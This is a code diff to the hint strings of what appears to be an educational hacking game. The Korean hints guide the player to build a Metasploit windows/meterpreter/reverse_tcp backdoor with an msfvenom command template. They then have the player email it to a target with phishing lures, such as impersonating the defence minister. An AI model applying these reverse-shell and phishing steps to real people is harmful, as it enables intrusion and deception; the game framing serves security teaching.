@@ -31,10 +31,10 @@ async def main(file_path: str):
 def api(type: str):
     resp = {'count':['0','2','2','1','2','7','2','1','1','1','2','3','2','1'],
     'tip': ['You FOUND Easter EGG!!!\n\nCONGRATUATIONS\n\nhttps://sv.m03.pw/hacknet_ItsEasterEgg.html',
-    '우리가 울랄라 대장의 이메일 주소를 알아냈어.\n이 주소로 백도어가 심어진 PPT파일을 보내야 해.\n먼저 PPT파일에 백도어를 심어보자.\n백도어를 만들때에는 Metasploit를 사용합니다.\n먼저, 자신의 IP를 알아내자! 어떻게 해야 할까??\n',
+    '우리가 울랄라 대장의 이메일 주소를 알아냈어.\n이 주소로 백도어가 심어진 PPT파일을 보내야 해.\n먼저 PPT파일에 백도어를 심어보자.\n백도어를 만들때에는 Metasploit를 사용합니다.\n먼저, 자신의 IP를 알아내자! 어떻게 해야 할까?? "ipconfig"를 치면 나올꺼야!! 그리고 만약 정답을 모르겠으면 "show_ans"를 치면 위에 답이 나와! \n',
     '백도어를 만들어 보자! METASPLOIT이라는 프로그램은, 백도어가 심어진 파일을 만들 수 있게 해줘. METASPLOIT은 msfvenom라는 명령어로 확인할 수 있습니다! 이제 Metasploit을 사용하는 법을 알아야 겠지? 어떤 명령어의 도움말을 알기 위해서는 "man <명령어>"라는 명령어를 사용해. 기억해 두자! 이제 사용법을 알아볼까? msfvenom 사용법은 "man msfvenom"을 치면 알 수 있겠지?',
     '이제 백도어를 만들어야 겠지? 동영상에서 알려준 대로 백도어 파일을 만들어 보자! 우리가 쓸 페이로드는 windows/meterpreter/reverse_tcp야!\n msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -f <형식> > back.exe으로 back.exe라는 파일을 만들자! 게임 실행파일이 있는 곳과 같은 곳에 만들어 질거야!',
-    '''울랄라 대표의 이메일은 gshs_decode@gmail.com이야.
+    '''울랄라 대표의 이메일은 gshsdecode@gmail.com이야.
 여기에 만든 파일을 보낼 건데 대표가 이메일의 내용물을 다운받을 수 있게끔 낚시성 내용을 적어야겠지?
 국방부 장관인척하고 보내도 되고 어그로를 끌 수 있는 자극적인 내용을 보내도 돼.
 이후 답장을 받고 백도어가 작동하는지 확인해보자! 백도어는 msfconsole이라는 명령어로 실행할 수 있어! 도움말을 보자! "man msfconsole"''',
